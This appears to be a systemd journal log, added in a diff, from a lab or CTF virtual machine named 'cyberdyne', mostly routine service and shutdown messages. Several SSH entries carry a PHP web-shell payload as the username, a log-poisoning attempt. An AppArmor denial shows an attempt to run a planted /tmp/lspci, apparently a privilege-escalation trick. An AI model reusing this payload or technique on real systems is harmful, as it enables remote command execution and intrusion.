@@ -1,0 +1,224 @@
+-- Logs begin at Wed 2021-01-06 09:50:33 WET, end at Wed 2021-01-06 10:10:45 WET. --
+jan 06 09:50:33 cyberdyne systemd[1]: Stopping The Apache HTTP Server...
+jan 06 09:50:33 cyberdyne apachectl[888]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
+jan 06 09:50:33 cyberdyne systemd[1]: apache2.service: Succeeded.
+jan 06 09:50:33 cyberdyne systemd[1]: Stopped The Apache HTTP Server.
+jan 06 09:50:33 cyberdyne systemd[1]: Starting The Apache HTTP Server...
+jan 06 09:50:33 cyberdyne apachectl[893]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
+jan 06 09:50:33 cyberdyne systemd[1]: Started The Apache HTTP Server.
+jan 06 09:50:36 cyberdyne rsyslogd[854]: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="854" x-info="https://www.rsyslog.com"] exiting on signal 15.
+jan 06 09:50:36 cyberdyne systemd[1]: Stopping System Logging Service...
+jan 06 09:50:36 cyberdyne systemd[1]: rsyslog.service: Succeeded.
+jan 06 09:50:36 cyberdyne systemd[1]: Stopped System Logging Service.
+jan 06 09:50:36 cyberdyne systemd[1]: Starting System Logging Service...
+jan 06 09:50:36 cyberdyne systemd[1]: Started System Logging Service.
+jan 06 09:50:36 cyberdyne rsyslogd[908]: imuxsock: Acquired UNIX socket '/run/systemd/journal/syslog' (fd 3) from systemd.  [v8.2010.0]
+jan 06 09:50:36 cyberdyne rsyslogd[908]: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="908" x-info="https://www.rsyslog.com"] start
+jan 06 09:57:33 cyberdyne systemd[1]: Starting Cleanup of Temporary Directories...
+jan 06 09:57:33 cyberdyne systemd[1]: systemd-tmpfiles-clean.service: Succeeded.
+jan 06 09:57:33 cyberdyne systemd[1]: Finished Cleanup of Temporary Directories.
+jan 06 09:59:53 cyberdyne sshd[924]: Invalid user <?php system($_GET["cmd"]);?> from 192.168.1.118 port 57998
+jan 06 10:00:34 cyberdyne sshd[924]: Failed none for invalid user <?php system($_GET["cmd"]);?> from 192.168.1.118 port 57998 ssh2
+jan 06 10:00:35 cyberdyne sshd[924]: Failed password for invalid user <?php system($_GET["cmd"]);?> from 192.168.1.118 port 57998 ssh2
+jan 06 10:00:35 cyberdyne sshd[924]: Failed password for invalid user <?php system($_GET["cmd"]);?> from 192.168.1.118 port 57998 ssh2
+jan 06 10:00:35 cyberdyne sshd[924]: Connection closed by invalid user <?php system($_GET["cmd"]);?> 192.168.1.118 port 57998 [preauth]
+jan 06 10:03:14 cyberdyne systemd[1]: proc-sys-fs-binfmt_misc.automount: Got automount request for /proc/sys/fs/binfmt_misc, triggered by 957 (find)
+jan 06 10:03:14 cyberdyne systemd[1]: Mounting Arbitrary Executable File Formats File System...
+jan 06 10:03:14 cyberdyne systemd[1]: Mounted Arbitrary Executable File Formats File System.
+jan 06 10:04:21 cyberdyne audit[981]: AVC apparmor="DENIED" operation="exec" profile="/usr/sbin/sysinfo" name="/tmp/lspci" pid=981 comm="sysinfo" requested_mask="x" denied_mask="x" fsuid=0 ouid=33
+jan 06 10:04:21 cyberdyne kernel: audit: type=1400 audit(1609927461.786:7): apparmor="DENIED" operation="exec" profile="/usr/sbin/sysinfo" name="/tmp/lspci" pid=981 comm="sysinfo" requested_mask="x" denied_mask="x" fsuid=0 ouid=33
+jan 06 10:07:41 cyberdyne sshd[1016]: Accepted password for skynet from 192.168.1.108 port 31367 ssh2
+jan 06 10:07:41 cyberdyne sshd[1016]: pam_unix(sshd:session): session opened for user skynet by (uid=0)
+jan 06 10:07:41 cyberdyne systemd[1]: Started Session 3 of user skynet.
+jan 06 10:07:41 cyberdyne systemd-logind[275]: New session 3 of user skynet.
+jan 06 10:07:41 cyberdyne sshd[1016]: pam_unix(sshd:session): session closed for user skynet
+jan 06 10:07:41 cyberdyne systemd-logind[275]: Session 3 logged out. Waiting for processes to exit.
+jan 06 10:07:41 cyberdyne systemd[1]: session-3.scope: Succeeded.
+jan 06 10:07:41 cyberdyne systemd-logind[275]: Removed session 3.
+jan 06 10:09:01 cyberdyne CRON[1027]: pam_unix(cron:session): session opened for user root by (uid=0)
+jan 06 10:09:01 cyberdyne systemd[1]: Starting Clean php session files...
+jan 06 10:09:01 cyberdyne CRON[1029]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)
+jan 06 10:09:01 cyberdyne CRON[1027]: pam_unix(cron:session): session closed for user root
+jan 06 10:09:01 cyberdyne systemd[1]: phpsessionclean.service: Succeeded.
+jan 06 10:09:01 cyberdyne systemd[1]: Finished Clean php session files.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopping Session 1 of user skynet.
+jan 06 10:10:43 cyberdyne dockerd[383]: time="2021-01-06T10:10:43.661008447Z" level=info msg="Processing signal 'terminated'"
+jan 06 10:10:43 cyberdyne systemd[1]: Removed slice system-modprobe.slice.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped target Graphical Interface.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped target Sound Card.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped target Timers.
+jan 06 10:10:43 cyberdyne systemd[1]: anacron.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Trigger anacron every hour.
+jan 06 10:10:43 cyberdyne systemd[1]: apt-daily-upgrade.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Daily apt upgrade and clean activities.
+jan 06 10:10:43 cyberdyne systemd[1]: apt-daily.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Daily apt download activities.
+jan 06 10:10:43 cyberdyne systemd[1]: e2scrub_all.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Periodic ext4 Online Metadata Check for All Filesystems.
+jan 06 10:10:43 cyberdyne systemd[1]: fstrim.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Discard unused blocks once a week.
+jan 06 10:10:43 cyberdyne systemd[1]: logrotate.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Daily rotation of log files.
+jan 06 10:10:43 cyberdyne systemd[1]: phpsessionclean.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Clean PHP session files every 30 mins.
+jan 06 10:10:43 cyberdyne systemd[1]: systemd-tmpfiles-clean.timer: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Daily Cleanup of Temporary Directories.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped target System Time Synchronized.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped target System Time Set.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopping Docker Application Container Engine...
+jan 06 10:10:43 cyberdyne systemd[1]: Stopping Load/Save Random Seed...
+jan 06 10:10:43 cyberdyne systemd[1]: getty@tty1.service: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Getty on tty1.
+jan 06 10:10:43 cyberdyne systemd[1]: systemd-random-seed.service: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Load/Save Random Seed.
+jan 06 10:10:43 cyberdyne systemd[1]: session-1.scope: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped Session 1 of user skynet.
+jan 06 10:10:43 cyberdyne systemd[1]: Removed slice system-getty.slice.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopping User Manager for UID 1000...
+jan 06 10:10:43 cyberdyne systemd[1]: user@1000.service: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped User Manager for UID 1000.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopping User Runtime Directory /run/user/1000...
+jan 06 10:10:43 cyberdyne systemd-logind[275]: Session 1 logged out. Waiting for processes to exit.
+jan 06 10:10:43 cyberdyne systemd[1]: run-user-1000.mount: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Unmounted /run/user/1000.
+jan 06 10:10:43 cyberdyne systemd[1]: user-runtime-dir@1000.service: Succeeded.
+jan 06 10:10:43 cyberdyne systemd[1]: Stopped User Runtime Directory /run/user/1000.
+jan 06 10:10:43 cyberdyne systemd[1]: Removed slice User Slice of UID 1000.
+jan 06 10:10:43 cyberdyne systemd-logind[275]: Removed session 1.
+jan 06 10:10:44 cyberdyne dockerd[383]: time="2021-01-06T10:10:44.463187587Z" level=info msg="ignoring event" container=4c6f495895a75c904d5e42813a55fdd8cb391c7e8fdaf0d42b811ee785c56584 module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+jan 06 10:10:44 cyberdyne containerd[285]: time="2021-01-06T10:10:44.464343193Z" level=info msg="shim disconnected" id=4c6f495895a75c904d5e42813a55fdd8cb391c7e8fdaf0d42b811ee785c56584
+jan 06 10:10:44 cyberdyne kernel: docker0: port 1(veth963ac17) entered disabled state
+jan 06 10:10:44 cyberdyne kernel: veth0774a16: renamed from eth0
+jan 06 10:10:44 cyberdyne kernel: docker0: port 1(veth963ac17) entered disabled state
+jan 06 10:10:44 cyberdyne kernel: device veth963ac17 left promiscuous mode
+jan 06 10:10:44 cyberdyne kernel: docker0: port 1(veth963ac17) entered disabled state
+jan 06 10:10:44 cyberdyne systemd-udevd[1120]: veth0774a16: Failed to query device driver: No such device
+jan 06 10:10:44 cyberdyne systemd-udevd[1120]: veth0774a16: Failed to get link config: No such device
+jan 06 10:10:44 cyberdyne systemd[1]: run-docker-netns-c2b85295c277.mount: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Unmounted /run/docker/netns/c2b85295c277.
+jan 06 10:10:44 cyberdyne systemd[1]: var-lib-docker-overlay2-6c211bbdbed480083d7130fa5dfe29d65c913cadc6902f260d17bd46b5201ad3-merged.mount: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Unmounted /var/lib/docker/overlay2/6c211bbdbed480083d7130fa5dfe29d65c913cadc6902f260d17bd46b5201ad3/merged.
+jan 06 10:10:44 cyberdyne dockerd[383]: time="2021-01-06T10:10:44.514266393Z" level=info msg="Daemon shutdown complete"
+jan 06 10:10:44 cyberdyne systemd[1]: docker.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Docker Application Container Engine.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Multi-User System.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Login Prompts.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Network is Online.
+jan 06 10:10:44 cyberdyne sshd[309]: Received signal 15; terminating.
+jan 06 10:10:44 cyberdyne containerd[285]: time="2021-01-06T10:10:44.530144242Z" level=info msg="Stop CRI service"
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping The Apache HTTP Server...
+jan 06 10:10:44 cyberdyne rsyslogd[908]: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="908" x-info="https://www.rsyslog.com"] exiting on signal 15.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping containerd container runtime...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping Regular background program processing daemon...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping D-Bus System Message Bus...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping System Logging Service...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping OpenBSD Secure Shell server...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping User Login Management...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping Permit User Sessions...
+jan 06 10:10:44 cyberdyne systemd[1]: cron.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Regular background program processing daemon.
+jan 06 10:10:44 cyberdyne systemd[1]: ssh.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped OpenBSD Secure Shell server.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-user-sessions.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Permit User Sessions.
+jan 06 10:10:44 cyberdyne systemd[1]: rsyslog.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped System Logging Service.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-logind.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped User Login Management.
+jan 06 10:10:44 cyberdyne systemd[1]: containerd.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped containerd container runtime.
+jan 06 10:10:44 cyberdyne systemd-udevd[1122]: veth0774a16: Failed to query device driver: No such device
+jan 06 10:10:44 cyberdyne systemd-udevd[1122]: veth0774a16: Failed to get link config: No such device
+jan 06 10:10:44 cyberdyne apachectl[1137]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
+jan 06 10:10:44 cyberdyne systemd[1]: dbus.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped D-Bus System Message Bus.
+jan 06 10:10:44 cyberdyne systemd[1]: apache2.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped The Apache HTTP Server.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Basic System.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Network.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Paths.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Remote File Systems.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Slices.
+jan 06 10:10:44 cyberdyne systemd[1]: Removed slice User and Session Slice.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Sockets.
+jan 06 10:10:44 cyberdyne systemd[1]: dbus.socket: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Closed D-Bus System Message Bus Socket.
+jan 06 10:10:44 cyberdyne systemd[1]: docker.socket: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Closed Docker Socket for the API.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target System Initialization.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Local Encrypted Volumes.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-ask-password-console.path: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Dispatch Password Requests to Console Directory Watch.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-ask-password-wall.path: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Forward Password Requests to Wall Directory Watch.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped target Swap.
+jan 06 10:10:44 cyberdyne systemd[1]: syslog.socket: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Closed Syslog Socket.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivating swap /dev/disk/by-id/ata-VBOX_HARDDISK_VB994caeca-58865715-part1...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping ifup for eth0...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping Raise network interfaces...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping Network Time Synchronization...
+jan 06 10:10:44 cyberdyne systemd[1]: Stopping Update UTMP about System Boot/Shutdown...
+jan 06 10:10:44 cyberdyne systemd[1]: dev-disk-by\x2dpath-pci\x2d0000:00:0d.0\x2data\x2d1\x2dpart1.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/disk/by-path/pci-0000:00:0d.0-ata-1-part1.
+jan 06 10:10:44 cyberdyne systemd[1]: dev-disk-by\x2dpartuuid-f58fcb60\x2d01.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/disk/by-partuuid/f58fcb60-01.
+jan 06 10:10:44 cyberdyne systemd[1]: dev-disk-by\x2did-ata\x2dVBOX_HARDDISK_VB994caeca\x2d58865715\x2dpart1.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/disk/by-id/ata-VBOX_HARDDISK_VB994caeca-58865715-part1.
+jan 06 10:10:44 cyberdyne systemd[1]: dev-disk-by\x2duuid-122809c6\x2d2a53\x2d4508\x2d92a1\x2d5a9a1157b54f.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/disk/by-uuid/122809c6-2a53-4508-92a1-5a9a1157b54f.
+jan 06 10:10:44 cyberdyne systemd[1]: dev-disk-by\x2dpath-pci\x2d0000:00:0d.0\x2data\x2d1.0\x2dpart1.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/disk/by-path/pci-0000:00:0d.0-ata-1.0-part1.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-timesyncd.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Network Time Synchronization.
+jan 06 10:10:44 cyberdyne systemd[1]: dev-sda1.swap: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Deactivated swap /dev/sda1.
+jan 06 10:10:44 cyberdyne systemd[1]: Reached target Unmount All Filesystems.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-update-utmp.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Update UTMP about System Boot/Shutdown.
+jan 06 10:10:44 cyberdyne systemd[1]: systemd-tmpfiles-setup.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Create Volatile Files and Directories.
+jan 06 10:10:44 cyberdyne dhclient[1161]: Killed old client process
+jan 06 10:10:44 cyberdyne ifdown[1161]: Killed old client process
+jan 06 10:10:44 cyberdyne systemd[1]: networking.service: Succeeded.
+jan 06 10:10:44 cyberdyne systemd[1]: Stopped Raise network interfaces.
+jan 06 10:10:45 cyberdyne dhclient[1161]: Internet Systems Consortium DHCP Client 4.4.1
+jan 06 10:10:45 cyberdyne ifdown[1161]: Internet Systems Consortium DHCP Client 4.4.1
+jan 06 10:10:45 cyberdyne dhclient[1161]: Copyright 2004-2018 Internet Systems Consortium.
+jan 06 10:10:45 cyberdyne ifdown[1161]: Copyright 2004-2018 Internet Systems Consortium.
+jan 06 10:10:45 cyberdyne dhclient[1161]: All rights reserved.
+jan 06 10:10:45 cyberdyne ifdown[1161]: All rights reserved.
+jan 06 10:10:45 cyberdyne dhclient[1161]: For info, please visit https://www.isc.org/software/dhcp/
+jan 06 10:10:45 cyberdyne ifdown[1161]: For info, please visit https://www.isc.org/software/dhcp/
+jan 06 10:10:45 cyberdyne dhclient[1161]: 
+jan 06 10:10:45 cyberdyne dhclient[1161]: Listening on LPF/eth0/08:00:27:cb:10:cc
+jan 06 10:10:45 cyberdyne ifdown[1161]: Listening on LPF/eth0/08:00:27:cb:10:cc
+jan 06 10:10:45 cyberdyne dhclient[1161]: Sending on   LPF/eth0/08:00:27:cb:10:cc
+jan 06 10:10:45 cyberdyne ifdown[1161]: Sending on   LPF/eth0/08:00:27:cb:10:cc
+jan 06 10:10:45 cyberdyne dhclient[1161]: Sending on   Socket/fallback
+jan 06 10:10:45 cyberdyne ifdown[1161]: Sending on   Socket/fallback
+jan 06 10:10:45 cyberdyne dhclient[1161]: DHCPRELEASE of 192.168.1.122 on eth0 to 192.168.1.9 port 67
+jan 06 10:10:45 cyberdyne ifdown[1161]: DHCPRELEASE of 192.168.1.122 on eth0 to 192.168.1.9 port 67
+jan 06 10:10:45 cyberdyne systemd[1]: ifup@eth0.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped ifup for eth0.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped target Local File Systems.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped target Local File Systems (Pre).
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-sysctl.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped Apply Kernel Variables.
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-modules-load.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped Load Kernel Modules.
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-tmpfiles-setup-dev.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped Create Static Device Nodes in /dev.
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-sysusers.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped Create System Users.
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-remount-fs.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Stopped Remount Root and Kernel File Systems.
+jan 06 10:10:45 cyberdyne systemd[1]: Reached target Shutdown.
+jan 06 10:10:45 cyberdyne systemd[1]: Reached target Final Step.
+jan 06 10:10:45 cyberdyne systemd[1]: systemd-poweroff.service: Succeeded.
+jan 06 10:10:45 cyberdyne systemd[1]: Finished Power-Off.
+jan 06 10:10:45 cyberdyne systemd[1]: Reached target Power-Off.
+jan 06 10:10:45 cyberdyne systemd[1]: Shutting down.
+jan 06 10:10:45 cyberdyne systemd-shutdown[1]: Syncing filesystems and block devices.
+jan 06 10:10:45 cyberdyne systemd-shutdown[1]: Sending SIGTERM to remaining processes...
+jan 06 10:10:45 cyberdyne systemd-journald[186]: Journal stopped
